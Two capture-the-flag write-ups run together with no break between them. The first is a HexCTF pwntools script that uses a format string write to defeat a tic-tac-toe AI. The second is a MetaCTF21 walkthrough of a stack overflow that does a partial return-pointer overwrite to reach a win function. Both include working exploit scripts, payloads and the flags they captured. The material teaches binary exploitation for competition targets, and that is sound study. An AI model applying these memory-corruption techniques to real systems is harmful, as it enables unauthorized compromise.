### Exploit code:

```  
#!/usr/bin/env python  
from pwn import *

elf = context.binary = ELF('./ttt',checksec=False)

if args.REMOTE:  
   s1 = ssh("ttt","challenges2.hexionteam.com",3004,"hexctf")  
   proc = s1.process('./ttt')  
else:  
   proc = process(elf.path)

"""  
============  
Attack plan:  
============  
Use format string bug in the following code:

   puts("Please enter your name: ");  
   scanf("%24s", name);  
   getchar();  
   snprintf(message, 100, "Welcome %s!\n", name);

To change the value of the function the AI uses to decide its move:

   logic_func DIFFICULTY = IMPOSSIBLE;

Basically we just change the function to a "return 0;".

Testing it out with gdb:

   pwndbg> x/gx 0x603010  
   0x603010 <DIFFICULTY>:       0x0000000000401cd5  
   pwndbg> x/2i 0x0000000000401cd5  
      0x401cd5 <IMPOSSIBLE>:	push   rbp  
      0x401cd6 <IMPOSSIBLE+1>:	mov    rbp,rsp  
   pwndbg> x/65i 0x401d91  
      0x401d91 <IMPOSSIBLE+188>:	mov    eax,0x0  
      0x401d96 <IMPOSSIBLE+193>:	jmp    0x401d9c <IMPOSSIBLE+199>  
      0x401d98 <IMPOSSIBLE+195>:	movsx  eax,BYTE PTR [rbp-0xd]  
      0x401d9c <IMPOSSIBLE+199>:	leave    
      0x401d9d <IMPOSSIBLE+200>:	ret      
   pwndbg> set *(long *)0x603010=0x401d91

And then playing against the AI, we find that if we make the following moves:

   ,---,---,---,  
   |   |   |   |  
   |---+---+---|  
   |   |   |   |  
   |---+---+---|  
   | 3 | 2 | 1 |  
   '---'---'---'

Its doesnt make a move agaisnt us.

So, we just need to change the value at 0x603010, from 0x401cd5 to 0x401d91.  
This is just a write of two bytes, which we can do easily with out format
string bug.  
We just need to know our input starts at positional argument and to remember
that  
8 bytes have already been printed by the "Welcome ".  
"""  
proc.recvuntil('your name: \n')  
fmt = '%7561c%10$hnaaaa'+p64(0x603010)  
proc.sendline(fmt)

proc.recvuntil('Press ENTER to begin.\n')  
proc.sendline('')   # send enter  
proc.sendline('a')  # go left (wrap into last column)  
proc.sendline('s')  # move down to middle row.  
proc.sendline('s')  # move down to bottom row.  
proc.sendline(' ')  # send space to fill square (bottom-left)  
proc.sendline('a')  # move left (into middle column)  
proc.sendline(' ')  # send space to fill square (bottom-middle)  
proc.sendline('a')  # move left (into left column)  
proc.sendline(' ')  # send space to fill square (bottom-left)  
proc.sendline('q')  # finish game

lines_printed = proc.recvuntil('Do you want to play again?')  
print "\n".join(lines_printed.split('\n')[-4:])  
```

### Using it:

```  
$ ./exploit.py REMOTE  
[+] Connecting to challenges2.hexionteam.com on port 3004: Done  
[*] [email protected]:  
Distro    Unknown  
OS:       linux  
Arch:     amd64  
Version:  5.0.0  
ASLR:     Enabled  
[+] Starting rem*

hexCTF{h3y_th4ts_ch3at1ng}  
Do you want to play again?  
$  
```# Tic Tac Toe

The description for this challenge is as follows:

*I made this super impressive Tic Tac Toe application; it will tell you who won a match. Don't you think that is amazing? I'm hosting it at host.cg21.metaproblems.com on port 3120 if you want to test it out. Here I'll even give you the source code to try it out yourself if you would like!*

*No brute force is needed, the solution should work everytime!*

This was one of the easier pwn problems, with 79 solves, and it was worth 200
points. In my opinion, the reverse engineering was the hardest part. The
downloadables for this challenge were a tar archive that contained the
original binary, C source code, and docker setup information; I just ran the
binary locally and did not use the docker setup.

**TL;DR Solution:** Notice that you can keep inputting bad characters in order
to overflow a stack buffer. Specifically, you can overwrite into the counter
variable in order to target the return pointer for overwrite. Then do a
partial overwrite on the return pointer in order to call the win function.

## Original Writeup Link

This writeup is also available on my GitHub! View it there via this link:
https://github.com/knittingirl/CTF-
Writeups/tree/main/pwn_challs/MetaCTF21/Tic_Tac_Toe

## Gathering Information

As usual, my first step is to run the program with some different inputs. If I
enter in 9 x's and o's, it determines a winner and prints it out:  
```  
knittingirl@piglet:~/CTF/metaCTF21/tic_tac_toe$ ./chall  
Check out this sweet Tic-Tac-Toe Solver I made!  
All you have to do is to input your array into the system and I'll tell you
who won  
You can enter them all at once, or one at a time if you prefer  
xoxoxoxox  
X's win the game  
The game is a CAT  
```  
When I run checkes on the binary, I can see that most notably, PIE is enabled,
as is NX. So we will not be able to do stack-based shellcode, and addresses in
the code section will be randomized.  
```  
knittingirl@piglet:~/CTF/metaCTF21/tic_tac_toe$ checksec chall  
[*] '/home/knittingirl/CTF/metaCTF21/tic_tac_toe/chall'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```  
Next, I take a look at how the program works, using the C code since that is
available. Notably, the program contains a win function:  
```  
//Useless function when you think about it, because it's impossible to get
here... Right?  
void win(){  
	int fd;  
	char buffer[100];  
	fd = open("./flag.txt",0);  
	read(fd, buffer,100);  
	write(1,buffer,100);  
	_exit(0);  
}  
```  
I am also interested in the portion that reads in user input. If the last
character of the input was an x, X, o, O, or 0, and the length of the input is
more 9, the program will stop reading in characters. Otherwise, it will keep
reading them in to a stack variable, and new characters are loaded in to the
address of the board variable, plus the value of the counter variable. As long
as we do not input any newlines, that counter variable will keep going up.
This then presents a good opportunity for a stack-based buffer overflow; I
simply need to ensure that I enter all my characters in on one line, and that
no characters past the ninth are on my "good characters" list until I am ready
to return out.  
```  
int read_board(){  
	char board[3][3];  
	char counter = 0;

	//read the board in  
	while (counter < 9){  
		while(1){  
			read(0, (char*)board+counter++, 1);

			if (*((char *)board+counter-1) == '\n')  
			{  
				counter--;  
				continue;  
			}  
			//checks for the last character to be o,O,0,x,X   
			//I was a bit lazy in the checks though, so you need to be consistant when using characters  
			//Or the program won't match correctly  
			if (*((char*)board + counter-1) == 'o' || *((char*)board + counter-1) == 'O' ||*((char*)board + counter-1) == '0' || *((char*)board + counter-1) == 'x' || *((char*)board + counter-1) == 'X'){  
				break;  
			}  
			puts("Bad Character, try again");  
		}  
	}  
```  
Another interesting fact is that when I do some basic analysis of the binary
in Ghidra, I can see that the counter variable is at a higher stack offset
than the board variable, which means that this stack-based overwrite will
overwrite the counter variable, specifically on the tenth character (0x13 -
0x9 = 10). As a result, I will have to be careful to make that overwrite
appropriately in order to hit the return pointer in subsequent writes.  
```  
                            **************************************************************  
                            *                          FUNCTION                          *  
                            **************************************************************  
                            undefined read_board()  
            undefined         AL:1           <RETURN>                                XREF[1]:     001014c5(W)    
            undefined8        RAX:8          long_i_minus_1                          XREF[1]:     001014c5(W)    
            undefined1        Stack[-0x9]:1  counter                                 XREF[12]:    001014b0(W),   
                                                                                                  001014b9(R),   
                                                                                                  001014c2(W),   
                                                                                                  001014e2(R),   
                                                                                                  001014f9(R),   
                                                                                                  00101500(W),   
                                                                                                  00101505(R),   
                                                                                                  0010151c(R),   
                                                                                                  00101533(R),   
                                                                                                  0010154a(R),   
                                                                                                  00101561(R),   
                                                                                                  00101589(R)    
            undefined1[10]    Stack[-0x13]   board                                   XREF[0,13]:  001014c9(*),   
                                                                                                  001014eb(*),   
                                                                                                  0010150e(*),   
                                                                                                  00101525(*),   
                                                                                                  0010153c(*),   
                                                                                                  00101553(*),   
                                                                                                  0010156a(*),   
                                                                                                  00101593(*),   
                                                                                                  001015a3(*),   
                                                                                                  001015b6(*),   
                                                                                                  001015c6(*),   
                                                                                                  001015d9(*),   
                                                                                                  001015e9(*)    
                            read_board                                      XREF[4]:     Entry Point(*), main:00101640(c),   
                                                                                         00102198, 00102310(*)    
       001014a8 55              PUSH       RBP

```

## Planning the Exploit:

At this point, my approach is fairly straightforward. I need to target the
return pointer for overwrite, and because of the presence of PIE, I should aim
for a partial overwrite. To check how viable this is, I do a run of the
program in GDB/GEF where I simply input nine x's and o's, then check where the
read_board function returns to normally in comparison with the address of the
win function.  
```  
  0x564c588a8601 <read_board+345> call   0x564c588a8449 <print_winner>  
  0x564c588a8606 <read_board+350> nop  
  0x564c588a8607 <read_board+351> leave  
→ 0x564c588a8608 <read_board+352> ret  
  ↳  0x564c588a8645 <main+60>        mov    edi, 0x0  
     0x564c588a864a <main+65>        call   0x564c588a8030 <_exit@plt>  
     0x564c588a864f <win+0>          push   rbp  
     0x564c588a8650 <win+1>          mov    rbp, rsp  
     0x564c588a8653 <win+4>          sub    rsp, 0x70  
     0x564c588a8657 <win+8>          mov    esi, 0x0  
─────────────────────────────────────────────────────────────────── threads
────  
[#0] Id 1, Name: "chall", stopped 0x564c588a8608 in read_board (), reason:
BREAKPOINT  
───────────────────────────────────────────────────────────────────── trace
────  
[#0] 0x564c588a8608 → read_board()  
[#1] 0x564c588a8645 → main()  
────────────────────────────────────────────────────────────────────────────────  
gef➤  x/gx $rsp  
0x7ffebc7e6df8: 0x0000564c588a8645  
gef➤  x/gx win  
0x564c588a864f <win>:   0x70ec8348e5894855  
gef➤  
```  
This turns out to be very convenient; it returns out near the end of the main
function at address 0x0000564c588a8645, and the win function is at
0x0000564c588a864f. As a result, a single-byte overwrite should work. In
addition, the byte that I need to overwrite is the byte of 'O'. This means
that once it is input, the program will return out to the win function that
has been newly placed in the return pointer, which is ideal.

Finally, I do need to figure out exactly what I need to overwrite the counter
stack variable with in order to overwrite the lowest byte of the return
pointer. I did it by looking at the stack offset of the board variable in
Ghidra, which is -0x13, so the appropriate offset should be at 0x13. 1 is
getting added to the value in counter before it is used to determine where the
stack write occurs, so the value to write to the counter variable should be
0x12. The fact that this is low also explains why entering a large amount of
bad characters in ascii typically fails to generate a segfault; the return
pointer is being overshot completely.

## Writing the Exploit

At this point, the exploit itself is very straightforward. I just need to pad
it with nine bad characters, include a b'\x12' to overwrite the counter, the
add an 'O' in order to partial overwrite the return pointer with the function.
Here is the full exploit script:  
```  
from pwn import *

#target = process('./chall')

#pid = gdb.attach(target, "\nb *read_board+29\nb *read_board+352\n set
disassembly-flavor intel\ncontinue")

target = remote('host.cg21.metaproblems.com', 3120)

print(target.recvuntil(b'time if you prefer'))

payload = (b'a' * 9 + b'\x12' + b'\x4f')

target.sendline(payload)

target.interactive()  
```  
And here is how it looks when I run the script:  
```  
knittingirl@piglet:~/CTF/metaCTF21/tic_tac_toe$ python3 tic_tac_toe_payload.py  
[+] Opening connection to host.cg21.metaproblems.com on port 3120: Done  
b"Check out this sweet Tic-Tac-Toe Solver I made!\nAll you have to do is to
input your array into the system and I'll tell you who won\nYou can enter them
all at once, or one at a time if you prefer"  
[*] Switching to interactive mode

Bad Character, try again  
Bad Character, try again  
Bad Character, try again  
Bad Character, try again  
Bad Character, try again  
Bad Character, try again  
Bad Character, try again  
Bad Character, try again  
Bad Character, try again  
Bad Character, try again  
Something went wrong  
Something went wrong  
Something went wrong  
The game is a CAT  
MetaCTF{Tic_Tac_Pwn}  
\x7f\x00\xa0\xc0\xd9\xd3%V\x00\xe0\x99C\xff\x7f\x00\x00\x00\x00\x00z\xc4\xd9\xd3%V\x00\xf9\xc3\xd9\xd3%V\x00\xe6\x99C\x00\x00\xf0\x99C\xff\x7f\x00\x06\xd9\xd3%V\x00\xa0\xc0\xd9\xd3%Vaaaaaa$  
```  
Thanks for reading!Original writeup (https://museifu.com/#tic-tac-toe).